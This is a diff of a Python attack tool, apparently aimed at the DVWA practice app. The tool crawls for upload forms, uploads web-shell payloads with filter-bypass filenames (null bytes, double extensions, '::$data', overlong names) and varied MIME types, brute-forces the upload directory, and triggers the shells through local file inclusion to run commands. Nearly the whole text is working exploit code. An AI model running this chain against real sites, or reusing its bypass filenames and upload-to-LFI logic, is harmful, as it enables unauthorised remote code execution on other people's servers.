@@ -19,33 +19,33 @@ COOKIE = {"PHPSESSID": "9amrgdojgjebidiqqse4c5jpsr"}
 #     "security": "medium",
 # }
 
-UPLOAD_DIR_WORDLIST = "upload_dir_wordlist.txt"
 WORDLIST = "wordlists/test"
+CONTENT_TYPE_WORDLIST = "wordlists/content_type_big.txt"  # wordlists/content_type_small.txt OR wordlists/content_type_big.txt
+UPLOAD_DIR_WORDLIST = "wordlists/upload_dir_wordlist_small.txt"  # wordlists/upload_dir_wordlist_small.txt OR wordlists/upload_dir_wordlist_big.txt
 
-# PAYLOAD_FILENAME = "malicious.php"
 REPORT_FILENAME = "vuln_report.txt"
-CONTENT_TYPE_FILE = "content_type.txt"
+
 
 # ✅ Required Payload Filenames
-PAYLOAD_FILENAMES = [
-    "shell.php.jpg",
-    "shell.pHp5",
-    "shell.png.php",
-    "shell.php#.png",
-    "shell.php%20",
-    "shell.phpJunk123png",
-    "shell.png.jpg.php",
-    "shell.php%00.png",
-    "shell.php...",
-    "shell.php.png",
-    "shell.asp::$data",
-    "A" * 232 + ".php",
-    "A" * 232 + ".png",
-    "shell.php%0a",
-    "shell.php%00",
-    "shell.php%0d%0a",
-    "shell.php%00.png%00.jpg",
-]
+# PAYLOAD_FILENAMES = [F
+#     "shell.php.jpg",
+#     "shell.pHp5",
+#     "shell.png.php",
+#     "shell.php#.png",
+#     "shell.php%20",
+#     "shell.phpJunk123png",
+#     "shell.png.jpg.php",
+#     "shell.php%00.png",
+#     "shell.php...",
+#     "shell.php.png",
+#     "shell.asp::$data",
+#     "A" * 232 + ".php",
+#     "A" * 232 + ".png",
+#     "shell.php%0a",
+#     "shell.php%00",
+#     "shell.php%0d%0a",
+#     "shell.php%00.png%00.jpg",
+# ]
 
 
 def generate_report(uploaded_files, failed_files, executed_files):
@@ -87,7 +87,7 @@ def main():
     success_indicator = input("Enter the text that indicates success: ")
     failure_indicator = input("Enter the text that indicates failure: ")
 
-    # 🔍 Step 1: Crawl for URLs
+    # Step 1: Crawl for URLs
     found_urls, uploadable_urls = crawler.main_crawl(URL, WORDLIST, COOKIE)
     print("Crawling complete.")
 
@@ -106,6 +106,7 @@ def main():
     form_details = crawler.get_form_details(URL, uploadable_urls, session, COOKIE)
     # form_action_urls = crawler.get_form_action_urls(URL ,uploadable_urls, session, COOKIE)
 
+    # Step 2: Check for LFI vulnerabilities
     lfi_confirmed_targets = set()
     for target in lfi_targets:
         print(target)
@@ -113,20 +114,20 @@ def main():
         if result:
             lfi_confirmed_targets.add(target)
 
-    # 🔹 Step 2: Generate payloads
+    # Step 3: Generate payloads
     generated_payloads = uploadv2.create_payloads()
 
-    # 🔹 Step 3: Load MIME types
-    mime_types = uploadv2.load_mime_types(CONTENT_TYPE_FILE)
+    # Step 4: Load MIME types
+    mime_types = uploadv2.load_mime_types(CONTENT_TYPE_WORDLIST)
 
     if not mime_types:
         print("[-] No MIME types found. Exiting.")
         exit(1)
 
-    # 🔹 Step 4: Combine payload lists
+    # Step 4: Combine payload lists
     # payload_filenames = PAYLOAD_FILENAMES + generated_payloads
 
-    # 🔹 Step 5: Try Uploading Each Payload
+    # Step 5: Try Uploading Each Payload
     uploaded_files = []
     failed_files = []
 
@@ -134,7 +135,7 @@ def main():
         form_action_url = form["action"]
         for payload in generated_payloads:
             if uploadv2.upload_file(
-                payload, form_action_url, COOKIE, form, CONTENT_TYPE_FILE
+                payload, form_action_url, COOKIE, form, CONTENT_TYPE_WORDLIST
             ):
                 print(f"[+] File uploaded successfully: {payload} -> {form_action_url}")
                 uploaded_files.append(payload)
@@ -143,13 +144,13 @@ def main():
 
     # for url in form_action_urls:
     #     for payload in generated_payloads:
-    #         if uploadv2.upload_file(url, payload, COOKIE, CONTENT_TYPE_FILE):
+    #         if uploadv2.upload_file(url, payload, COOKIE, CONTENT_TYPE_WORDLIST):
     #             print(f"[+] File uploaded successfully: {payload} -> {url}")
     #             uploaded_files.append(payload)
     #         else:
     #             failed_files.append(payload)
 
-    # 🔹 Step 6: Detect upload directory
+    # Step 6: Detect upload directory
     dynamic_upload_dir = uploadv2.get_upload_directory(
         URL, UPLOAD_DIR_WORDLIST, uploaded_files, COOKIE
     )
@@ -166,23 +167,27 @@ def main():
         # generate_report(uploaded_files, failed_files, [])
         # exit(1)
 
-    # 🔹 Step 7: Test execution
+    # Step 7: Test execution
     executed_files = []
     for target in lfi_confirmed_targets:
-        lfi_found_url = lfi.brute_force_lfi(
+        lfi_found_urls = lfi.brute_force_lfi(
             target,
             uploaded_files,
             success_indicator,
             failure_indicator,
+            UPLOAD_DIR_WORDLIST,
             session,
             COOKIE,
         )
-        if lfi_found_url:
-            print(f"[+] LFI Found at: {lfi_found_url}")
-            command_results = lfi.trigger_payload_via_lfi(lfi_found_url, COOKIE)
-            executed_files.append(lfi_found_url)
+        if lfi_found_urls:
+            for lfi_found_url in lfi_found_urls:
+                print(f"[+] LFI Found at: {lfi_found_url}")
+                command_results = lfi.trigger_payload_via_lfi(lfi_found_url, COOKIE)
+                if command_results:
+                    print(f"[+] Successfully executed payload at: {lfi_found_url}")
+                    executed_files.append(lfi_found_url)
 
-    # 🔹 Step 8: Generate Final Report
+    # Step 8: Generate Final Report
     generate_report(uploaded_files, failed_files, executed_files)
 
 
